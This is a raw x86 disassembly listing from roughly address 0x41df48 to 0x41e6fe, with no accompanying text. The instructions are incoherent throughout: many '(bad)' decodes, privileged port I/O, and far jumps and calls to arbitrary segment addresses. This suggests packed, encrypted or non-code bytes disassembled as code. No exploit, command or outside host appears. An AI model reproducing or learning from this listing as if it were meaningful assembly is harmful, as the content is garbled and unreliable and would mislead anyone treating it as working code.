  41df48:	cmp    eax,0x8391503d
  41df4d:	pop    ss
  41df4e:	cdq    
  41df4f:	rcl    bh,0xcf
  41df52:	adc    al,0xca
  41df54:	enter  0x8570,0x28
  41df58:	sub    bl,0x19
  41df5b:	xchg   BYTE PTR ds:0x684abc55,ch
  41df61:	push   ebp
  41df62:	fld    TBYTE PTR [ebp+0x40d457c0]
  41df68:	push   edx
  41df69:	sbb    bh,BYTE PTR [ebx+ecx*2-0x166d27df]
  41df70:	ret    0x744
  41df73:	inc    ecx
  41df74:	sbb    DWORD PTR [edi+ecx*1],ebx
  41df77:	adc    dh,bh
  41df79:	mov    bh,0x8e
  41df7b:	lds    eax,FWORD PTR [ebx+0x61]
  41df7e:	pop    ebp
  41df7f:	lods   eax,DWORD PTR ds:[esi]
  41df80:	jmp    0x9c739cb0
  41df85:	xchg   DWORD PTR [ecx],ebp
  41df87:	pop    ds
  41df88:	das    
  41df89:	ficomp WORD PTR [esi+0x50]
  41df8c:	and    eax,0xfd452dbe
  41df91:	adc    al,0xe9
  41df93:	fwait
  41df94:	stos   BYTE PTR es:[edi],al
  41df95:	mov    ecx,0x81b8aaa
  41df9a:	fwait
  41df9b:	add    cl,cl
  41df9d:	or     ah,BYTE PTR [edx+edx*2]
  41dfa0:	(bad)  
  41dfa1:	div    DWORD PTR [ebx+edx*2-0x3d]
  41dfa5:	jo     0x41df44
  41dfa7:	adc    al,0x7a
  41dfa9:	jmp    0x5b8a:0x4ce24fb0
  41dfb0:	leave  
  41dfb1:	xor    ch,BYTE PTR [ebx+edi*4]
  41dfb4:	div    DWORD PTR [edi+0x14]
  41dfb7:	push   cs
  41dfb8:	test   DWORD PTR [esi],esp
  41dfba:	push   eax
  41dfbb:	mov    eax,0xe1045ea5
  41dfc0:	add    BYTE PTR [ecx+0x2b17dda8],ch
  41dfc6:	jmp    0xc411:0x9b041ab1
  41dfcd:	dec    ebp
  41dfce:	(bad)  
  41dfcf:	cs ss pop ebx
  41dfd2:	and    DWORD PTR [ebp+0x29],0xffffffe9
  41dfd6:	mov    ds:0xc750d172,al
  41dfdb:	jmp    0x8601:0xa260f01c
  41dfe2:	call   DWORD PTR [esi]
  41dfe4:	(bad)  [edx]
  41dfe6:	pop    edx
  41dfe7:	dec    ecx
  41dfe8:	jmp    0x5c7e:0x20803381
  41dfef:	test   al,0x36
  41dff1:	adc    esi,edx
  41dff3:	mov    BYTE PTR [ecx-0x33549840],0xe
  41dffa:	jne    0x41dfe5
  41dffc:	fild   DWORD PTR [ebx-0x5]
  41dfff:	mov    eax,ds:0x8b8b73d3
  41e004:	sar    ebp,0xb8
  41e007:	pop    edx
  41e008:	out    dx,al
  41e009:	sub    DWORD PTR [eax],0x91d2a8d4
  41e00f:	cmp    al,0x82
  41e011:	inc    esp
  41e012:	mov    bh,0x4b
  41e014:	sbb    BYTE PTR [eax],0xb0
  41e017:	in     eax,dx
  41e018:	sub    eax,0xb736b772
  41e01d:	rcl    DWORD PTR [edx-0x35],cl
  41e020:	jo     0x41e038
  41e022:	jbe    0x41e025
  41e024:	and    eax,0x4354315d
  41e029:	test   eax,0x440f9498
  41e02e:	call   0xf6d2d641
  41e033:	push   edx
  41e034:	scas   eax,DWORD PTR es:[edi]
  41e035:	(bad)  
  41e037:	fwait
  41e038:	xchg   edx,eax
  41e039:	sub    DWORD PTR cs:[ecx+0xfa8f12d],edx
  41e040:	adc    edi,DWORD PTR [edx*4-0x664a5d0f]
  41e047:	aam    0x3
  41e049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e04a:	inc    ebp
  41e04b:	and    bl,ch
  41e04d:	popf   
  41e04e:	dec    ebx
  41e04f:	mov    ds:0x462750d6,al
  41e054:	dec    ebp
  41e055:	or     ch,BYTE PTR [esp+esi*4]
  41e058:	jmp    0x767078d5
  41e05d:	out    0xab,eax
  41e05f:	leave  
  41e060:	int    0x1c
  41e062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e063:	stos   BYTE PTR es:[edi],al
  41e064:	mov    es,WORD PTR [ebx-0x10]
  41e067:	or     edx,DWORD PTR [ebx+0x4]
  41e06a:	fdivr  DWORD PTR [eax+0x23f8ce2f]
  41e070:	mov    ch,0xfc
  41e072:	push   ss
  41e073:	mov    ah,0xf0
  41e075:	pusha  
  41e076:	inc    ebx
  41e077:	xchg   ecx,eax
  41e078:	mov    WORD PTR [edx+0x39],?
  41e07b:	scas   eax,DWORD PTR es:[edi]
  41e07c:	je     0x41e022
  41e07e:	jo     0x41e0a2
  41e080:	sub    ah,BYTE PTR [eax-0x2b]
  41e083:	loop   0x41e05c
  41e085:	pop    ebx
  41e086:	stc    
  41e087:	ins    DWORD PTR es:[edi],dx
  41e088:	js     0x41e0cf
  41e08a:	add    eax,ebp
  41e08c:	repz cmc 
  41e08e:	lods   al,BYTE PTR ds:[esi]
  41e08f:	adc    cl,BYTE PTR [edx+0x33]
  41e092:	ja     0x41e037
  41e094:	sub    al,0xaf
  41e096:	ret    
  41e097:	mov    ds,WORD PTR [esi]
  41e099:	xor    DWORD PTR [edi],ebx
  41e09b:	cmp    bl,0x4a
  41e09e:	call   0xf172:0xd9b00821
  41e0a5:	xchg   bl,bh
  41e0a7:	(bad)  
  41e0a8:	imul   edi,edx,0x35
  41e0ab:	es pop edx
  41e0ad:	jnp    0x41e102
  41e0af:	stc    
  41e0b0:	fldcw  WORD PTR [esi+eax*4-0x14fe526b]
  41e0b7:	jmp    0x9af2:0xf297b599
  41e0be:	or     al,al
  41e0c0:	adc    DWORD PTR [ebp+ebx*8+0x78ac404],esp
  41e0c7:	push   eax
  41e0c8:	sti    
  41e0c9:	out    0xf4,al
  41e0cb:	xchg   ebp,eax
  41e0cc:	xor    edx,esi
  41e0ce:	in     eax,dx
  41e0cf:	mov    eax,ds:0x2f442785
  41e0d4:	sub    al,0xee
  41e0d6:	fimul  DWORD PTR [eax+0x57]
  41e0d9:	mov    edx,0x82b1d9d1
  41e0de:	hlt    
  41e0df:	aam    0x31
  41e0e1:	jmp    0xf19e:0xb614f818
  41e0e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0e9:	(bad)  
  41e0ea:	fxch   st(6)
  41e0ec:	stos   BYTE PTR es:[edi],al
  41e0ed:	add    eax,0xafe9127b
  41e0f2:	jb     0x41e16e
  41e0f4:	adc    DWORD PTR [edx+0x2e],ebx
  41e0f7:	mov    dl,0x95
  41e0f9:	fldcw  WORD PTR fs:0x3a0583d1
  41e100:	pop    ss
  41e101:	sub    al,0xef
  41e103:	mov    esi,0xdd10df3e
  41e108:	fdivr  DWORD PTR [ecx]
  41e10a:	retf   0xe06e
  41e10d:	in     eax,dx
  41e10e:	out    0xa7,al
  41e110:	fadd   st,st(7)
  41e112:	or     ecx,DWORD PTR [ebx+0x6bd908f0]
  41e118:	stc    
  41e119:	outs   dx,BYTE PTR ds:[esi]
  41e11a:	dec    edx
  41e11b:	shl    DWORD PTR [ebx+edx*4+0x19691496],cl
  41e122:	or     edx,DWORD PTR [eax+0x760c8bd8]
  41e128:	aad    0x38
  41e12a:	and    BYTE PTR [ebp-0x78],cl
  41e12d:	mov    ds:0xd6ee6674,eax
  41e132:	jmp    0xd6735d2
  41e137:	pop    esi
  41e138:	push   0x670ca1bb
  41e13d:	xchg   DWORD PTR [ebx],edx
  41e13f:	cmp    dh,ch
  41e141:	sbb    al,0x20
  41e143:	and    DWORD PTR [ebx+0x498c2a9d],edi
  41e149:	fdivr  DWORD PTR [ebp+0x6ecc773f]
  41e14f:	push   esi
  41e150:	ins    BYTE PTR es:[edi],dx
  41e151:	or     DWORD PTR [edx+0xa],0xffffffee
  41e155:	adc    ebx,DWORD PTR [esi-0x21]
  41e158:	add    DWORD PTR [esi],0xec01abb5
  41e15e:	cmp    eax,DWORD PTR ss:[edi]
  41e161:	cmc    
  41e162:	mov    ebp,edx
  41e164:	in     al,0xf
  41e166:	mov    al,0x56
  41e168:	sub    DWORD PTR [eax-0x766ebbfa],esi
  41e16e:	push   ss
  41e16f:	ja     0x41e1e1
  41e171:	push   ebx
  41e172:	jge    0x41e12b
  41e174:	jecxz  0x41e12a
  41e176:	or     al,0x1b
  41e178:	inc    ebp
  41e179:	mov    ebx,0x4bd556cd
  41e17e:	push   ebp
  41e17f:	push   ecx
  41e180:	fldenv [eax+0x17]
  41e183:	jns    0x41e13d
  41e185:	xchg   DWORD PTR [ecx+0x44463d4],eax
  41e18b:	in     al,dx
  41e18c:	pop    ss
  41e18d:	mov    ds:0xdd2a8ab7,al
  41e192:	and    ebp,eax
  41e194:	adc    eax,0x7af1f936
  41e199:	daa    
  41e19a:	jle    0x41e1b3
  41e19c:	lahf   
  41e19d:	dec    edx
  41e19e:	pop    esp
  41e19f:	pop    ebp
  41e1a0:	je     0x41e124
  41e1a2:	call   0x2c6f:0x2b9c2a4a
  41e1a9:	xchg   esp,eax
  41e1aa:	ret    
  41e1ab:	mov    esp,0x9463fe7c
  41e1b0:	test   eax,0x143e27ae
  41e1b5:	xor    DWORD PTR [edi],eax
  41e1b7:	out    0x10,eax
  41e1b9:	pusha  
  41e1ba:	out    0x18,al
  41e1bc:	pop    ebx
  41e1bd:	es or  eax,0xbc205d38
  41e1c3:	push   esp
  41e1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1c5:	push   esi
  41e1c6:	push   esp
  41e1c7:	mov    fs,WORD PTR [edx]
  41e1c9:	sbb    eax,0x387fd8d5
  41e1ce:	mov    al,ds:0x838b0fb9
  41e1d3:	jmp    0x1d8:0x80abc3ce
  41e1da:	mov    es,edx
  41e1dc:	ror    DWORD PTR [ecx+0x38db085a],1
  41e1e2:	mov    ds:0x86534eaa,al
  41e1e7:	cmc    
  41e1e8:	fs jecxz 0x41e220
  41e1eb:	dec    esp
  41e1ec:	jmp    0x41e1f0
  41e1ee:	mov    bl,BYTE PTR [edx-0x45]
  41e1f1:	mov    esp,0x7a514231
  41e1f6:	mov    edi,0xe46544e3
  41e1fb:	popf   
  41e1fc:	in     al,0x54
  41e1fe:	dec    esi
  41e1ff:	jae    0x41e27d
  41e201:	outs   dx,DWORD PTR ds:[esi]
  41e202:	cwde   
  41e203:	lods   eax,DWORD PTR ds:[esi]
  41e204:	xchg   edi,eax
  41e205:	test   al,0xac
  41e207:	cmc    
  41e208:	push   0xf68d6a5f
  41e20d:	lods   eax,DWORD PTR gs:[esi]
  41e20f:	cmp    ah,bl
  41e211:	and    DWORD PTR [eax+0x4e0e6af9],ebx
  41e217:	or     al,0xf8
  41e219:	pop    ebx
  41e21a:	sbb    DWORD PTR [ebx],edx
  41e21c:	mov    ds:0x6e4e4773,eax
  41e221:	hlt    
  41e222:	icebp  
  41e223:	mov    ch,al
  41e225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e226:	cli    
  41e227:	loopne 0x41e297
  41e229:	int    0x89
  41e22b:	lods   eax,DWORD PTR ds:[esi]
  41e22c:	jmp    0x41e221
  41e22e:	repnz icebp 
  41e230:	and    al,0x1e
  41e232:	pop    eax
  41e233:	cmc    
  41e234:	or     eax,0x5175207c
  41e239:	xor    eax,0x1e58eb39
  41e23e:	add    ecx,DWORD PTR [esi-0x58]
  41e241:	bound  eax,QWORD PTR [esi+eiz*4]
  41e244:	cld    
  41e245:	nop
  41e246:	fdiv   QWORD PTR [edx+0x39270f75]
  41e24c:	cmp    bl,bl
  41e24e:	rcl    BYTE PTR [ebp+0x47],1
  41e251:	or     al,0xc8
  41e253:	cmp    al,0xae
  41e255:	cmp    al,0x75
  41e257:	mov    cl,0x7a
  41e259:	or     esi,DWORD PTR [edx]
  41e25b:	frstor [eax+0x78]
  41e25e:	fiadd  WORD PTR [ecx+0x1c]
  41e261:	pop    edx
  41e262:	cld    
  41e263:	sub    eax,0x95669674
  41e268:	sub    eax,0x76ffd13c
  41e26d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e26e:	dec    ecx
  41e26f:	outs   dx,BYTE PTR ds:[esi]
  41e270:	lock pop ebp
  41e272:	jo     0x41e201
  41e274:	setp   BYTE PTR [ecx]
  41e277:	sub    al,0xe2
  41e279:	or     DWORD PTR [ebx+0x7872013e],0x32
  41e280:	leave  
  41e281:	(bad)  
  41e282:	(bad)  [ebx]
  41e284:	adc    DWORD PTR [ebx],ebp
  41e286:	shr    ebx,0x8a
  41e289:	dec    edi
  41e28a:	sub    al,0x3e
  41e28c:	out    dx,al
  41e28d:	add    DWORD PTR [edi],edx
  41e28f:	repz pop ss
  41e291:	out    0xe3,eax
  41e293:	cmp    ebp,eax
  41e295:	xchg   esp,eax
  41e296:	adc    dh,BYTE PTR [edx]
  41e298:	push   ebx
  41e299:	data16 xor al,0xd6
  41e29c:	imul   edi,DWORD PTR [eax+0x436e79fc],0xffffffa1
  41e2a3:	lea    esp,[eax+0x75937c81]
  41e2a9:	test   cl,al
  41e2ab:	inc    esp
  41e2ac:	inc    ebx
  41e2ad:	not    BYTE PTR [ecx]
  41e2af:	in     eax,0x84
  41e2b1:	scas   eax,DWORD PTR es:[edi]
  41e2b2:	cmp    esi,edx
  41e2b4:	dec    ebx
  41e2b5:	out    dx,eax
  41e2b6:	xor    al,BYTE PTR [edx]
  41e2b8:	or     BYTE PTR [ecx],bh
  41e2ba:	mov    cl,0xbc
  41e2bc:	div    BYTE PTR [eax+0x33bcc6bf]
  41e2c2:	add    ch,0xab
  41e2c5:	push   esi
  41e2c6:	sub    dh,BYTE PTR [esi+0x14]
  41e2c9:	mov    cl,0xe5
  41e2cb:	fadd   st,st(6)
  41e2cd:	jbe    0x41e2b2
  41e2cf:	int3   
  41e2d0:	(bad)  
  41e2d1:	arpl   WORD PTR [eax-0x252a346d],si
  41e2d7:	mov    ch,BYTE PTR [ecx]
  41e2d9:	add    al,0x7a
  41e2db:	jmp    0x41e27d
  41e2dd:	pop    edi
  41e2de:	push   eax
  41e2df:	leave  
  41e2e0:	ret    0xa487
  41e2e3:	clc    
  41e2e4:	add    BYTE PTR [edx],cl
  41e2e6:	enter  0x52b7,0xba
  41e2ea:	in     al,dx
  41e2eb:	mov    eax,DWORD PTR [edi+0x64ee3534]
  41e2f1:	dec    edx
  41e2f2:	sub    DWORD PTR [edx],eax
  41e2f4:	les    esp,FWORD PTR [ecx-0xd]
  41e2f7:	cmp    al,0x1b
  41e2f9:	push   0xfbe7251f
  41e2fe:	xor    edx,DWORD PTR [ebp-0x3c]
  41e301:	mov    gs,ebp
  41e303:	mov    eax,ds:0x15478224
  41e308:	mov    edx,0xf90d3fa
  41e30d:	aad    0x4d
  41e30f:	lock xchg edi,eax
  41e311:	push   0xacd00ae2
  41e316:	inc    esp
  41e317:	inc    BYTE PTR [ebp+0x3aea47f1]
  41e31d:	popf   
  41e31e:	sub    edi,ebx
  41e320:	data16 jbe 0x41e2b4
  41e323:	pop    esp
  41e324:	push   ds
  41e325:	mov    edi,0x561dec40
  41e32a:	jo     0x41e317
  41e32c:	retf   
  41e32d:	(bad)  
  41e32e:	pop    ds
  41e32f:	(bad)  
  41e330:	mov    al,0xc8
  41e332:	jge    0x41e383
  41e334:	in     eax,0x78
  41e336:	lods   al,BYTE PTR ds:[esi]
  41e337:	push   ebp
  41e338:	jmp    0x9343b1e9
  41e33d:	mov    edi,0x170d7335
  41e342:	xor    BYTE PTR [edx+esi*4-0x60078635],bl
  41e349:	ds out dx,al
  41e34b:	jae    0x41e32a
  41e34d:	push   eax
  41e34e:	xchg   esp,eax
  41e34f:	popa   
  41e350:	std    
  41e351:	mov    dh,0x7e
  41e354:	hlt    
  41e355:	inc    edi
  41e356:	mov    ds:0xe4e367f1,al
  41e35b:	leave  
  41e35c:	hlt    
  41e35d:	(bad)  [esi]
  41e35f:	push   DWORD PTR [ecx+0x63f6b29a]
  41e365:	adc    DWORD PTR [eax-0x72511f12],esp
  41e36b:	das    
  41e36c:	call   0x98e2:0x83a62642
  41e373:	ficom  DWORD PTR [edx-0x45]
  41e376:	in     eax,dx
  41e377:	push   es
  41e378:	sub    BYTE PTR [esi+0x490167dd],bh
  41e37e:	push   ebx
  41e37f:	pop    ds
  41e380:	or     DWORD PTR [eax+0x17a156f5],edi
  41e386:	mov    bl,0xac
  41e388:	call   0x4985:0xf04b2422
  41e38f:	adc    BYTE PTR [eax-0x5d7e0cd7],ch
  41e395:	push   esi
  41e396:	and    edx,DWORD PTR [edx-0x7802eb0]
  41e39c:	cmp    ch,0x5b
  41e39f:	pop    edx
  41e3a0:	movzx  esp,BYTE PTR [eax+0x5d1f3007]
  41e3a7:	pop    esp
  41e3a8:	cld    
  41e3a9:	push   edi
  41e3aa:	sbb    eax,0x89cf4ebe
  41e3af:	outs   dx,DWORD PTR ds:[esi]
  41e3b0:	mov    eax,0x4bc038a4
  41e3b5:	in     al,0x0
  41e3b7:	(bad)  
  41e3b8:	cmp    ebp,DWORD PTR ss:[esi+0x672b7f2f]
  41e3bf:	adc    al,dl
  41e3c1:	pop    ss
  41e3c2:	dec    eax
  41e3c3:	xchg   edx,eax
  41e3c4:	dec    esi
  41e3c5:	mov    ds:0x31e3b16b,eax
  41e3ca:	out    dx,eax
  41e3cb:	dec    edi
  41e3cc:	aad    0xee
  41e3ce:	jmp    0xd9c5f7a7
  41e3d3:	jne    0x41e396
  41e3d5:	cmp    dl,BYTE PTR [esi]
  41e3d7:	pop    ebx
  41e3d8:	inc    ecx
  41e3d9:	sub    BYTE PTR [edi+0x7028160e],ah
  41e3df:	push   esp
  41e3e0:	adc    ch,ah
  41e3e2:	sbb    DWORD PTR [ebp-0x33c0cc93],ebx
  41e3e8:	cmp    BYTE PTR [ebp+0x542231c7],0x8a
  41e3ef:	sub    ebp,DWORD PTR [ebx]
  41e3f1:	jno    0x41e3ff
  41e3f3:	pusha  
  41e3f4:	out    0xb7,eax
  41e3f6:	lea    ebx,[ecx+0x542e95aa]
  41e3fc:	fst    QWORD PTR [esi+0x22]
  41e3ff:	add    BYTE PTR [ecx+edx*4-0x7f],0x69
  41e404:	mov    edx,esi
  41e406:	pop    edx
  41e407:	jmp    0xfb1e:0x1360ca73
  41e40e:	add    al,0xdf
  41e410:	dec    esi
  41e411:	add    BYTE PTR [edx+0x39a8b05c],0x7
  41e418:	stc    
  41e419:	adc    DWORD PTR [edx+0x35],ecx
  41e41c:	out    dx,eax
  41e41d:	adc    BYTE PTR [edx+0x6e],al
  41e420:	retf   0xef0d
  41e423:	cmp    al,cl
  41e425:	arpl   WORD PTR [ebp+ecx*4+0x71],cx
  41e429:	mov    dh,0x89
  41e42b:	jns    0x41e400
  41e42d:	pop    ebx
  41e42e:	add    esi,DWORD PTR [ebx]
  41e430:	mov    ecx,DWORD PTR [ecx+0x1f]
  41e433:	jecxz  0x41e3d1
  41e435:	pusha  
  41e436:	rcr    BYTE PTR [edx+0x5d],1
  41e439:	out    dx,eax
  41e43a:	fnsave [edi+ebp*8-0x359088bc]
  41e441:	xchg   edx,eax
  41e442:	lahf   
  41e443:	cmp    BYTE PTR [edx-0x7ec030bb],al
  41e449:	adc    BYTE PTR [edx],al
  41e44b:	bound  esp,QWORD PTR [eax]
  41e44d:	xor    esi,DWORD PTR [edx-0xe]
  41e450:	inc    edi
  41e451:	in     eax,dx
  41e452:	nop
  41e453:	push   edi
  41e454:	shl    DWORD PTR [edx-0xb7ab4f1],cl
  41e45a:	push   ds
  41e45b:	pop    edx
  41e45c:	(bad)  
  41e45d:	push   0xb764d8a6
  41e462:	mov    al,ds:0x4446c467
  41e467:	jae    0x41e4dc
  41e469:	enter  0x3b87,0xb0
  41e46d:	dec    ebx
  41e46e:	mov    esp,0x2bcbc0cf
  41e473:	nop
  41e474:	add    dh,BYTE PTR [eax+eiz*8]
  41e477:	push   0x4b
  41e479:	add    dh,BYTE PTR [edi]
  41e47b:	icebp  
  41e47c:	jmp    0x1919:0xe4235759
  41e483:	(bad)  
  41e484:	mov    ecx,0x5f57eae7
  41e489:	repnz aam 0x5c
  41e48c:	push   eax
  41e48d:	test   BYTE PTR es:[esi+0x7a3a56c2],0x20
  41e495:	stos   BYTE PTR es:[edi],al
  41e496:	popa   
  41e497:	mov    esp,0x8b50cc8
  41e49c:	out    dx,eax
  41e49d:	retf   
  41e49e:	mov    BYTE PTR [eax+esi*4],0x48
  41e4a2:	pop    edx
  41e4a3:	outs   dx,BYTE PTR ds:[esi]
  41e4a4:	xor    BYTE PTR [ebx-0x4a],bh
  41e4a7:	icebp  
  41e4a8:	lgs    esi,FWORD PTR [ecx-0x36]
  41e4ac:	and    dl,dh
  41e4ae:	pop    ss
  41e4af:	int3   
  41e4b0:	dec    esi
  41e4b1:	jbe    0x41e4f5
  41e4b3:	inc    esp
  41e4b4:	popf   
  41e4b5:	mov    esp,0x678dcceb
  41e4ba:	repz fist DWORD PTR [edx]
  41e4bd:	clc    
  41e4be:	shl    esp,0xe
  41e4c1:	pusha  
  41e4c2:	xchg   ebp,eax
  41e4c3:	in     al,0xb1
  41e4c5:	or     bh,BYTE PTR [eax+0x47e86ed2]
  41e4cb:	jmp    0xc179:0x6ba17c82
  41e4d2:	adc    bh,al
  41e4d4:	inc    eax
  41e4d5:	ror    DWORD PTR [eax+eiz*4+0xd],cl
  41e4d9:	mov    al,0xf1
  41e4db:	int3   
  41e4dc:	das    
  41e4dd:	js     0x41e505
  41e4df:	js     0x41e545
  41e4e1:	mov    esi,0xc108eb3
  41e4e6:	hlt    
  41e4e7:	repnz fstp QWORD PTR [edx]
  41e4ea:	jmp    0x41e51e
  41e4ec:	mov    ebp,0x6bd6b732
  41e4f1:	fbld   TBYTE PTR ds:0x882ce9b8
  41e4f7:	jne    0x41e507
  41e4f9:	pop    esi
  41e4fa:	call   0x11b004d7
  41e4ff:	or     ebx,eax
  41e501:	jl     0x41e508
  41e503:	jl     0x41e4aa
  41e505:	rol    esi,0xdf
  41e508:	and    BYTE PTR [ebp-0x1d6b5425],0x1
  41e50f:	sar    DWORD PTR [ecx-0x1e0de85d],cl
  41e515:	cmp    BYTE PTR [ebp+0x5b],0x86
  41e519:	mov    BYTE PTR [esi+0x5afed0f1],dl
  41e51f:	ret    0xb5bc
  41e522:	aaa    
  41e523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e524:	into   
  41e525:	xlat   BYTE PTR ds:[ebx]
  41e526:	outs   dx,DWORD PTR ds:[esi]
  41e527:	or     DWORD PTR [esp+eiz*2+0x10],esp
  41e52b:	shl    DWORD PTR [eax+eax*4-0x18],1
  41e52f:	or     bl,al
  41e531:	hlt    
  41e532:	dec    ebp
  41e533:	or     ax,0xafc
  41e537:	(bad)  
  41e538:	dec    ebx
  41e539:	pop    ecx
  41e53a:	jbe    0x41e573
  41e53c:	in     al,0x19
  41e53e:	(bad)  
  41e540:	push   edi
  41e541:	push   eax
  41e542:	and    DWORD PTR [eax+0x218b7505],0xb4c8659a
  41e54c:	loope  0x41e5a0
  41e54e:	or     BYTE PTR [eax],dh
  41e550:	inc    edx
  41e551:	sbb    DWORD PTR [edi],edi
  41e553:	mov    edi,0x958cdf24
  41e558:	pop    DWORD PTR [edx]
  41e55a:	pop    edi
  41e55b:	lods   eax,DWORD PTR ds:[esi]
  41e55c:	sub    eax,0xb514b26f
  41e561:	mov    bh,0x0
  41e563:	mov    ds:0x9062ab15,al
  41e568:	imul   ebx,esp,0xba7d7d32
  41e56e:	mov    ah,0x47
  41e570:	cmp    esi,DWORD PTR [eax]
  41e572:	daa    
  41e573:	retf   0xe806
  41e576:	nop
  41e577:	or     eax,0xd79d9ff0
  41e57c:	fisubr DWORD PTR [eax+0x40b17caa]
  41e582:	pop    ebx
  41e583:	out    0xaf,al
  41e585:	and    al,0xfd
  41e587:	inc    ebp
  41e588:	(bad)  
  41e58a:	sbb    BYTE PTR [eax-0xf9a5aa0],dh
  41e590:	call   0x1f2e:0xec811c55
  41e597:	call   0x8a5f811f
  41e59c:	xchg   BYTE PTR [ebx],ch
  41e59e:	sbb    dl,BYTE PTR [edi]
  41e5a0:	push   0x180308b7
  41e5a5:	aas    
  41e5a6:	daa    
  41e5a7:	pushf  
  41e5a8:	cmp    al,0x2b
  41e5aa:	xchg   ebp,eax
  41e5ab:	xor    BYTE PTR [edi+0x41],ch
  41e5ae:	jecxz  0x41e588
  41e5b0:	ja     0x41e616
  41e5b2:	fistp  QWORD PTR [edi]
  41e5b4:	sbb    eax,0xa61ed6a0
  41e5b9:	aaa    
  41e5ba:	push   ds
  41e5bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5bc:	mov    esi,0x922b319f
  41e5c1:	or     esi,DWORD PTR [eax+0x1]
  41e5c4:	jl     0x41e57b
  41e5c6:	nop
  41e5c7:	sub    DWORD PTR [ebp-0x5a48a4b],eax
  41e5cd:	and    ah,BYTE PTR ds:0xcaaab006
  41e5d3:	mov    edi,0x464ba37a
  41e5d8:	jno    0x41e5f2
  41e5da:	mov    cl,0xd9
  41e5dc:	stc    
  41e5dd:	push   cs
  41e5de:	push   esi
  41e5df:	cli    
  41e5e0:	mov    cl,0x33
  41e5e2:	jge    0x41e5e5
  41e5e4:	push   esi
  41e5e5:	iret   
  41e5e6:	daa    
  41e5e7:	pop    eax
  41e5e8:	pop    ebx
  41e5e9:	ja     0x41e574
  41e5eb:	int3   
  41e5ec:	xchg   ecx,eax
  41e5ed:	addr16 xchg ebx,eax
  41e5ef:	sbb    BYTE PTR [eax+0x2cf7705e],dh
  41e5f5:	sbb    edi,edx
  41e5f7:	jecxz  0x41e5a4
  41e5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5fa:	cmp    eax,DWORD PTR [eax]
  41e5fc:	dec    esi
  41e5fd:	mov    eax,ds:0xd13b7ae6
  41e602:	rcl    DWORD PTR [eax+eax*4+0x497c5d74],0x57
  41e60a:	sti    
  41e60b:	add    esi,esp
  41e60d:	lods   al,BYTE PTR ds:[esi]
  41e60e:	jl     0x41e645
  41e610:	in     eax,dx
  41e611:	xchg   esi,eax
  41e612:	inc    edi
  41e613:	ins    DWORD PTR es:[edi],dx
  41e614:	inc    ebx
  41e615:	les    esp,FWORD PTR [eax-0x22]
  41e618:	ss (bad) 
  41e61a:	pop    ebx
  41e61b:	in     eax,dx
  41e61c:	xlat   BYTE PTR ds:[ebx]
  41e61d:	or     al,0x13
  41e61f:	loope  0x41e5fc
  41e621:	jno    0x41e698
  41e623:	stc    
  41e624:	ror    DWORD PTR [ecx],cl
  41e626:	stc    
  41e627:	dec    esp
  41e628:	aaa    
  41e629:	adc    ecx,ebp
  41e62b:	std    
  41e62c:	dec    esp
  41e62d:	and    ecx,DWORD PTR [eax-0x32]
  41e630:	push   cs
  41e631:	call   0x870e:0x9a8af616
  41e638:	jae    0x41e631
  41e63a:	mov    bh,0x98
  41e63c:	sbb    al,0xa9
  41e63e:	add    eax,0x43cc7dca
  41e643:	ret    
  41e644:	shr    BYTE PTR [ecx-0x47],1
  41e647:	jnp    0x41e5e2
  41e649:	xor    ch,ah
  41e64b:	push   eax
  41e64c:	dec    edx
  41e64d:	mov    edx,0x2aaa47b8
  41e652:	outs   dx,BYTE PTR ds:[esi]
  41e653:	push   0xffffff8f
  41e655:	xchg   edi,eax
  41e656:	add    eax,0xe213fee5
  41e65b:	inc    esi
  41e65c:	xor    DWORD PTR [ebx-0x17667800],esi
  41e662:	push   cs
  41e663:	sub    eax,0x3c0c4774
  41e668:	mov    ecx,0x30a743f4
  41e66d:	nop
  41e66e:	jge    0x41e650
  41e670:	mov    ah,0x1
  41e672:	mov    DWORD PTR [ecx],0x1815aa5c
  41e678:	out    0x31,eax
  41e67a:	mov    edx,0xa72895cb
  41e67f:	shr    DWORD PTR [ebx-0x6e],cl
  41e682:	in     al,dx
  41e683:	jo     0x41e6e6
  41e685:	icebp  
  41e686:	and    ecx,DWORD PTR [ebx+0x67f95c5f]
  41e68c:	imul   edi,DWORD PTR [edi-0x37],0xffffffb6
  41e690:	fcmovne st,st(4)
  41e692:	add    al,0x29
  41e694:	mov    al,0x77
  41e696:	test   DWORD PTR ds:0xbc7c65e1,ebx
  41e69c:	jae    0x41e665
  41e69e:	xchg   BYTE PTR [ebp-0x3ba31331],cl
  41e6a4:	pop    eax
  41e6a5:	scas   eax,DWORD PTR es:[edi]
  41e6a6:	cld    
  41e6a7:	call   0xdab49186
  41e6ac:	mov    ds:0x39061608,al
  41e6b1:	cmp    ecx,DWORD PTR [ebx]
  41e6b3:	add    eax,ecx
  41e6b5:	cwde   
  41e6b6:	shl    BYTE PTR [edx-0x5e],1
  41e6b9:	es or  edi,esp
  41e6bc:	sbb    ah,bl
  41e6be:	pop    eax
  41e6bf:	and    ecx,DWORD PTR [ebp-0x61fb3440]
  41e6c5:	fbstp  TBYTE PTR [edx]
  41e6c8:	addr16 mov esp,0x4181ae68
  41e6ce:	inc    ebp
  41e6cf:	test   DWORD PTR [esi+0x39],0x73d601fc
  41e6d6:	or     al,BYTE PTR [ecx]
  41e6d8:	test   al,0x1b
  41e6da:	sbb    ecx,ebx
  41e6dc:	dec    DWORD PTR [ecx+ecx*8+0x31ae85b1]
  41e6e3:	pop    edi
  41e6e4:	ror    dh,cl
  41e6e6:	popa   
  41e6e7:	fwait
  41e6e8:	pushf  
  41e6e9:	(bad)  
  41e6ea:	test   BYTE PTR [eax-0x2a],0xbb
  41e6ee:	adc    edx,DWORD PTR [ecx-0x18]
  41e6f1:	in     al,dx
  41e6f2:	sub    DWORD PTR [esi-0x4c],eax
  41e6f5:	loop   0x41e738
  41e6f7:	adc    ebx,DWORD PTR [edx+0x271b3782]
  41e6fd:	xlat   BYTE PTR ds:[ebx]
  41e6fe:	pop    ebx
